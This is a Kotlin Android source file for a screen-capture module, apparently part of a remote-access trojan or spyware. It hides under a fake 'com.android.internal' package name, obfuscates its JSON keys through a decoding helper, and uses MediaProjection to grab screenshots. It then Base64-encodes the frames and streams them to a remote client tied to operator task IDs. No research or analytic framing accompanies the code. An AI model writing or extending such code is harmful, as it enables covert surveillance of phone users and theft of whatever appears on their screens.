package com.android.internal.svc.modules

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import android.util.DisplayMetrics
import android.view.WindowManager
import com.android.internal.svc.SyncAdapter
import com.android.internal.svc.Crypt
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

class DisplayHelper(private val context: Context) {

    companion object {
        @Volatile
        var projection: MediaProjection? = null
        var resultCode: Int = 0
        var resultData: Intent? = null
    }

    private fun k(e: String) = Crypt.d(e)

    private fun getMetrics(): DisplayMetrics {
        val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        wm.defaultDisplay.getRealMetrics(metrics)
        return metrics
    }

    fun capture(): JSONObject {
        if (projection == null && resultData == null) {
            return JSONObject().apply {
                put(k("PykuMiw="), "grant_required")
                put(k("NDQoOA=="), "send 'screen_grant' to trigger permission dialog")
            }
        }

        val metrics = getMetrics()
        val width = metrics.widthPixels
        val height = metrics.heightPixels
        val density = metrics.densityDpi

        val thread = HandlerThread("screen").apply { start() }
        val handler = Handler(thread.looper)

        val reader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
        val latch = CountDownLatch(1)
        var imageBytes: ByteArray? = null

        reader.setOnImageAvailableListener({ r ->
            val image = r.acquireLatestImage() ?: return@setOnImageAvailableListener
            try {
                val planes = image.planes
                val buffer = planes[0].buffer
                val pixelStride = planes[0].pixelStride
                val rowStride = planes[0].rowStride
                val rowPadding = rowStride - pixelStride * width

                val bmp = Bitmap.createBitmap(
                    width + rowPadding / pixelStride, height,
                    Bitmap.Config.ARGB_8888
                )
                bmp.copyPixelsFromBuffer(buffer)

                val cropped = Bitmap.createBitmap(bmp, 0, 0, width, height)
                val baos = ByteArrayOutputStream()
                cropped.compress(Bitmap.CompressFormat.JPEG, 60, baos)
                imageBytes = baos.toByteArray()

                bmp.recycle()
                cropped.recycle()
            } finally {
                image.close()
                latch.countDown()
            }
        }, handler)

        val mp = projection ?: run {
            val mpm = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            try {
                mpm.getMediaProjection(resultCode, resultData!!)
            } catch (e: Exception) {
                thread.quitSafely()
                reader.close()
                return JSONObject().put(k("PykuMiw="), "projection_failed: ${e.message}")
            }
        }
        projection = mp

        var vd: VirtualDisplay? = null
        try {
            vd = mp.createVirtualDisplay(
                "sk_vd",
                width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                reader.surface, null, handler
            )
        } catch (e: Exception) {
            thread.quitSafely()
            reader.close()
            return JSONObject().put(k("PykuMiw="), "display_failed: ${e.message}")
        }

        latch.await(5, TimeUnit.SECONDS)
        vd?.release()
        reader.close()
        thread.quitSafely()

        return if (imageBytes != null) {
            JSONObject().apply {
                put(k("KS89KSss"), "captured")
                put("width", width)
                put("height", height)
                put(k("KTImOA=="), imageBytes!!.size)
                put(k("PjooPA=="), Base64.encodeToString(imageBytes, Base64.NO_WRAP))
            }
        } else {
            JSONObject().put(k("PykuMiw="), "capture_timeout")
        }
    }

    fun stream(client: SyncAdapter, taskId: String, intervalMs: Int, frameCount: Int): JSONObject {
        var sent = 0
        for (i in 0 until frameCount) {
            val frame = capture()
            if (frame.has(k("PjooPA=="))) {
                client.sendResult(taskId, JSONObject().apply {
                    put("frame", i)
                    put("total", frameCount)
                    put(k("PjooPA=="), frame.getString(k("PjooPA==")))
                    put(k("KTImOA=="), frame.getInt(k("KTImOA==")))
                })
                sent++
            }
            if (i < frameCount - 1) {
                try { Thread.sleep(intervalMs.toLong()) } catch (_: Exception) { break }
            }
        }
        return JSONObject().apply {
            put(k("KS89KSss"), "stream_done")
            put("frames_sent", sent)
            put("frames_requested", frameCount)
        }
    }
}
